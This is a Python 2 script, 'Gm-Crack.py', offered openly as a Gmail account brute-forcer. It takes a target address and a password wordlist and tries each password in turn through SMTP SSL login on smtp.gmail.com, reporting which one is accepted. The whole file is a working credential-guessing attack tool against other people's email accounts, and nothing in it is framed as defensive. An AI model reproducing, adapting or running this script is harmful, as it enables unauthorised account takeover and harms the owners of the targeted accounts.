#!/usr/bin/python2
#!/usr/env python2

# Copyright by M-XacT-666
''' Script Kiddie, learn this script and modify with Your own style.
	Do not Paste and Copy it.
	Changing the Variabel and the Author Name didn't make You be a Programmer '''
# Note: ASCII Art is copyrighted to ...
#       Visit: https://www.asciiart.eu/weapons/axes

import platform,os,argparse,smtplib
if platform.system() == 'Windows':
	os.system('cls')
else:
	os.system('clear')
def jeda():
	raw_input("Press [ENTER] ")

parser = argparse.ArgumentParser()
parser.add_argument("--target",dest='target',help='Target Gmail Address',type=str)
parser.add_argument("--wlist",dest='wlist',help='Specify Wordlist to use',type=str,default='./wordlist/mxact666_password.txt')
parser.add_argument("--dserver",dest='dserver',help='SMTP Server to use',type=str,default='smtp.gmail.com')
parser.add_argument("--dport",dest='dport',help='SMTP Port to use',type=int,default=465)
options = parser.parse_args()

if options.target == '' or options.target == 'None' or options.target == None:
	print ""
	print "[!] Error: Target unidentificated! Please check again"
	print "           Your command! learn on 'EXAMPLE.txt'"
	print "           or You can try run 'Gm-Crack.py --help' command"
	print ""
	jeda()
	exit()

print '''
          XX
        XX..X         Gm-Crack.py ---> Gmail Account
      XX.....X                          Bruteforcer
 XXXXX.....XX
X |......XX%,.@       Coded by M-XacT-666 (copyright)
X |.....X  @#%,.@
X  \...X     @#%,.@
 X# \.X        @#%,.@      Server   :  {0}
  ##  X          @#%,.@      Port     :  {1}
, "# #X            @#%,.@      Target   :  {2} 
   `###X             @#%,.@      Wordlist :  {3}
  . ' ###              @#%.,@
    . ";"                @#%,.@
      '                    @#%,.@
      ` ,                    @#%,.@
                              @####@

'''.format(options.dserver,options.dport,options.target,options.wlist)

try:
	print "[*] Opening and Read Wordlist..."
	isi_wlist = open(options.wlist,'r').readlines()
	print "[+] Wordlist successfully opened and readed!"
except:
	print "[-] Error: Can't open or read Wordlist! check Location"
	print "           or try again. Wordlist File's is may too big"
	print "           or corrupted"
	print ""
	jeda()
	exit()
jumlah_kata = str(len(isi_wlist))
print "[+] Total Word Phrase: %s" % jumlah_kata
print ""
try:
	print "[*] Configuring SMTP for Authentication..."
	serper = smtplib.SMTP_SSL(options.dserver,options.dport)
	serper.ehlo()
	print "[+] SMTP for Authentication successfully configured!"
except:
	print "[-] Error: Can't configure SMTP Auth...check Your connection"
	print ""
	jeda()
	exit()
hitung = 0
print ""
confirm = raw_input("Confirmation (Y/n) > ")
if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
	print ""
	print "[-] Cracking Canceled with Confirmation..."
	print ""
	exit()
else:
	pass
print ""
for kata in isi_wlist:
	hitung += 1
	try:
		passkata = kata.strip()
		serper.login(options.target,passkata)
		print ""
		print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
		break
	except smtplib.SMTPAuthenticationError as ndass:
		error = str(ndass)
		if error[14] == '<':
			print ""
			print "[ ACCEPTED ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
			break
		else:
			print "[ INVALID ]===({0}/{1})===> {2} : {3}".format(hitung,jumlah_kata,options.target,passkata)
			pass
	except KeyboardInterrupt:
		print ""
		print "[-] Cracking Canceled with Keyboard Interrupt by User..."
		print ""
		jeda()
		exit()
	except:
		pass